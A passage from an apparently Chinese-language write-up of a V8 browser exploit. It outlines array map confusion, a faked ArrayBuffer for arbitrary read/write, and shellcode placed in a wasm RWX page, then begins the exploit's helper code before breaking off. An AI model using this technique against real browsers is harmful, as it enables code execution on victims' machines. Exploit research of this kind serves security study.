0x33a1055ce160: 0x0000000500000000 0x400a666666666666</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce170: 0x400a666666666666 0x400a666666666666</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce180: 0x400a666666666666 0x400a666666666666&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce190: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;c obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure><h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。<br>也可以直接gdb attach到chrome里调试。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>利用思路非常简单<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>我的exp写的比较dirty。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">String.prototype.padLeft &#x3D;</span><br><span class="line">Number.prototype.padLeft &#x3D; function(total, pad) &#123;</span><br><span class="line">  return (Array(total).join(pad || 0) + this).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return the hexadecimal representation of the given byte array.</span><br><span class="line">function hexlify(bytes) &#123;</span><br><span class="line">    var res &#x3D; [];</span><br><span class="line">    for (var i &#x3D; 0; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;print(bytes[i].toString(16));</span><br><span class="line">        res.push((&#39;0&#39; + bytes[i].toString(16)).substr(-2));</span><br><span class="line">    &#125;</span><br><span class="line">    return res.join(&#39;&#39;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return the binary data represented by the given hexdecimal string.</span><br><span class="line">function unhexlify(hexstr) &#123;</span><br><span class="line">    if (hexstr.length % 2 &#x3D;&#x3D; 1)</span><br><span class="line">        throw new TypeError(&quot;Invalid hex string&quot;);</span><br><span class="line"></span><br><span class="line">    var bytes &#x3D; new Uint8Array(hexstr.length &#x2F; 2);</span><br><span class="line">    for (var i &#x3D; 0; i &lt; hexstr.length; i +&#x3D; 2)</span><br><span class="line">        bytes[i&#x2F;2] &#x3D; parseInt(hexstr.substr(i, 2), 16);</span><br><span class="line"></span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hexdump(data) &#123;</span><br><span class="line">    if (typeof data.BYTES_PER_ELEMENT !&#x3D;&#x3D; &#39;undefined&#39;)</span><br><span class="line">        data &#x3D; Array.from(data);</span><br><span class="line"></span><br><span class="line">    var lines &#x3D; [];</span><br><span class="line">        var chunk &#x3D; data.slice(i, i+16);</span><br><span class="line">    for (var i &#x3D; 0; i &lt; data.length; i +&#x3D; 16) &#123;</span><br><span class="line">        var parts &#x3D; chunk.map(hex);</span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line">            parts.splice(8, 0, &#39; &#39;);</span><br><span class="line">        lines.push(parts.join(&#39; &#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return lines.join(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simplified version of the similarly named python module.</span><br><span class="line">var Struct &#x3D; (function() &#123;</span><br><span class="line">    &#x2F;&#x2F; Allocate these once to avoid unecessary heap allocations during pack&#x2F;unpack operations.</span><br><span class="line">    var buffer      &#x3D; new ArrayBuffer(8);</span><br><span class="line">    var byteView    &#x3D; new Uint8Array(buffer);</span><br><span class="line">    var uint32View  &#x3D; new Uint32Array(buffer);</span><br><span class="line">    var float64View &#x3D; new Float64Array(buffer);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        pack: function(type, value) &#123;</span><br><span class="line">            var view &#x3D; type;        &#x2F;&#x2F; See below</span><br><span class="line">            view[0] &#x3D; value;</span><br><span class="line">            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: function(type, bytes) &#123;</span><br><span class="line">            if (bytes.length !&#x3D;&#x3D; type.BYTES_PER_ELEMENT)</span><br><span class="line">                throw Error(&quot;Invalid bytearray&quot;);</span><br><span class="line"></span><br><span class="line">            var view &#x3D; type;        &#x2F;&#x2F; See below</span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            return view[0];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Available types.</span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function Int64(v) &#123;</span><br><span class="line">    &#x2F;&#x2F; The underlying byte array.</span><br><span class="line">    var bytes &#x3D; new Uint8Array(8);</span><br><span class="line"></span><br><span class="line">    switch (typeof v) &#123;</span><br><span class="line">        case &#39;number&#39;:</span><br><span class="line">            v &#x3D; &#39;0x&#39; + Math.floor(v).toString(16);</span><br><span class="line">        case &#39;string&#39;:</span><br><span class="line">            if (v.startsWith(&#39;0x&#39;))</span><br><span class="line">                v &#x3D; v.substr(2);</span><br><span class="line">            if (v.length % 2 &#x3D;&#x3D; 1)</span><br><span class="line">                v &#x3D; &#39;0&#39; + v;</span><br><span class="line"></span><br><span class="line">            var bigEndian &#x3D; unhexlify(v, 8);</span><br><span class="line">            &#x2F;&#x2F;print(bigEndian.toString());</span><br><span class="line">            bytes.set(Array.from(bigEndian).reverse());</span><br><span class="line">            break;</span><br><span class="line">        case &#39;object&#39;:</span><br><span class="line">            if (v instanceof Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (v.length !&#x3D; 8)</span><br><span class="line">                    throw TypeError(&quot;Array must have excactly 8 elements.&quot;);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &#39;undefined&#39;:</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            throw TypeError(&quot;Int64 constructor requires an argument.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return a double whith the same underlying bit representation.</span><br><span class="line">    this.asDouble &#x3D; function() &#123;</span><br><span class="line">        &#x2F;&#x2F; Check for NaN</span><br><span class="line">        if (bytes[7] &#x3D;&#x3D; 0xff &amp;&amp; (bytes[6] &#x3D;&#x3D; 0xff || bytes[6] &#x3D;&#x3D; 0xfe))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a double&quot;);</span><br><span class="line"></span><br><span class="line">        return Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return a javascript value with the same underlying bit representation.</span><br><span class="line">    &#x2F;&#x2F; This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br><span class="line">    &#x2F;&#x2F; due to double conversion constraints.</span><br><span class="line">    this.asJSValue &#x3D; function() &#123;</span><br><span class="line">        if ((bytes[7] &#x3D;&#x3D; 0 &amp;&amp; bytes[6] &#x3D;&#x3D; 0) || (bytes[7] &#x3D;&#x3D; 0xff &amp;&amp; bytes[6] &#x3D;&#x3D; 0xff))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a JSValue&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; For NaN-boxing, JSC adds 2^48 to a double value&#39;s bit pattern.</span><br><span class="line">        this.assignSub(this, 0x1000000000000);</span><br><span class="line">        var res &#x3D; Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        this.assignAdd(this, 0x1000000000000);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the underlying bytes of this number as array.</span><br><span class="line">    this.bytes &#x3D; function() &#123;</span><br><span class="line">        return Array.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the byte at the given index.</span><br><span class="line">    this.byteAt &#x3D; function(i) &#123;</span><br><span class="line">        return bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Return the value of this number as unsigned hex string.</span><br><span class="line">    this.toString &#x3D; function() &#123;</span><br><span class="line">        &#x2F;&#x2F;print(&quot;toString&quot;);</span><br><span class="line">        return &#39;0x&#39; + hexlify(Array.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Basic arithmetic.</span><br><span class="line">    &#x2F;&#x2F; These functions assign the result of the computation to their &#39;this&#39; object.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decorator for Int64 instance operations. Takes care</span><br><span class="line">    &#x2F;&#x2F; of converting arguments to Int64 instances if required.</span><br><span class="line">    function operation(f, nargs) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            if (arguments.length !&#x3D; nargs)</span><br><span class="line">                throw Error(&quot;Not enough arguments for function &quot; + f.name);</span><br><span class="line">            for (var i &#x3D; 0; i &lt; arguments.length; i++)</span><br><span class="line">                if (!(arguments[i] instanceof Int64))</span><br><span class="line">                    arguments[i] &#x3D; new Int64(arguments[i]);</span><br><span class="line">            return f.apply(this, arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; -n (two&#39;s complement)</span><br><span class="line">    this.assignNeg &#x3D; operation(function neg(n) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++)</span><br><span class="line">            bytes[i] &#x3D; ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        return this.assignAdd(this, Int64.One);</span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a + b</span><br><span class="line">    this.assignAdd &#x3D; operation(function add(a, b) &#123;</span><br><span class="line">        var carry &#x3D; 0;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur &#x3D; a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry &#x3D; cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] &#x3D; cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a - b</span><br><span class="line">    this.assignSub &#x3D; operation(function sub(a, b) &#123;</span><br><span class="line">        var carry &#x3D; 0;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur &#x3D; a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry &#x3D; cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] &#x3D; cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; this &#x3D; a &amp; b</span><br><span class="line">    this.assignAnd &#x3D; operation(function and(a, b) &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 8; i++) &#123;</span><br><span class="line">            bytes[i] &#x3D; a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Constructs a new Int64 instance with the same bit representation as the provided double.</span><br><span class="line">Int64.fromDouble &#x3D; function(d) &#123;</span><br><span class="line">    var bytes &#x3D; Struct.pack(Struct.float64, d);</span><br><span class="line">    return new Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Convenience functions. These allocate a new Int64 to hold the result.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return -n (two&#39;s complement)</span><br><span class="line">function Neg(n) &#123;</span><br><span class="line">    return (new Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a + b</span><br><span class="line">function Add(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a - b</span><br><span class="line">function Sub(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Return a &amp; b</span><br><span class="line">function And(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(a) &#123;</span><br><span class="line">    if (a &#x3D;&#x3D; undefined) return &quot;0xUNDEFINED&quot;;</span><br><span class="line">    var ret &#x3D; a.toString(16);</span><br><span class="line">    if (ret.substr(0,2) !&#x3D; &quot;0x&quot;) return &quot;0x&quot;+ret;</span><br><span class="line">    else return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function lower(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the lower 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upper(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the upper 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function lowerint(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the lower 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upperint(x) &#123;</span><br><span class="line">    &#x2F;&#x2F; returns the upper 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function combine(a, b) &#123;</span><br><span class="line">    &#x2F;&#x2F;a &#x3D; a &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;b &#x3D; b &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;print(a.toString());</span><br><span class="line">    &#x2F;&#x2F;print(b.toString());</span><br><span class="line">    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;padLeft用于字符串左补位</span><br><span class="line"></span><br><span class="line">function combineint(a, b) &#123;</span><br><span class="line">    &#x2F;&#x2F;a &#x3D; a &gt;&gt;&gt; 0;</span><br><span class="line">    &#x2F;&#x2F;b &#x3D; b &gt;&gt;&gt; 0;</span><br><span class="line">    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; based on Long.js by dcodeIO</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;dcodeIO&#x2F;Long.js</span><br><span class="line">  &#x2F;&#x2F; License Apache 2</span><br><span class="line">  class _u64 &#123;</span><br><span class="line">     constructor(hi, lo) &#123;</span><br><span class="line">        this.lo_ &#x3D; lo;</span><br><span class="line">        this.hi_ &#x3D; hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        var hlo &#x3D; (this.lo_ &lt; 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)</span><br><span class="line">        var hhi &#x3D; (this.hi_ &lt; 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)</span><br><span class="line">        if(hlo.substr(0,2) &#x3D;&#x3D; &quot;0x&quot;) hlo &#x3D; hlo.substr(2,hlo.length);</span><br><span class="line">        if(hhi.substr(0,2) &#x3D;&#x3D; &quot;0x&quot;) hhi &#x3D; hhi.substr(2,hji.length);</span><br><span class="line">        hlo &#x3D; &quot;00000000&quot; + hlo</span><br><span class="line">        hlo &#x3D; hlo.substr(hlo.length-8, hlo.length);</span><br><span class="line">        return &quot;0x&quot; + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        return this.hi_ &#x3D;&#x3D; 0 &amp;&amp; this.lo_ &#x3D;&#x3D; 0;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        return this.hi_ &#x3D;&#x3D; val.hi_ &amp;&amp; this.lo_ &#x3D;&#x3D; val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        return new _u64(this.hi_ &amp; val.hi_, this.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        var a48 &#x3D; this.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a32 &#x3D; this.hi_ &amp; 0xFFFF;</span><br><span class="line">        var a16 &#x3D; this.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a00 &#x3D; this.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var b48 &#x3D; val.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b32 &#x3D; val.hi_ &amp; 0xFFFF;</span><br><span class="line">        var b16 &#x3D; val.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b00 &#x3D; val.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var c48 &#x3D; 0, c32 &#x3D; 0, c16 &#x3D; 0, c00 &#x3D; 0;</span><br><span class="line">        c00 +&#x3D; a00 + b00;</span><br><span class="line">        c16 +&#x3D; c00 &gt;&gt;&gt; 16;</span><br><span class="line">        c00 &amp;&#x3D; 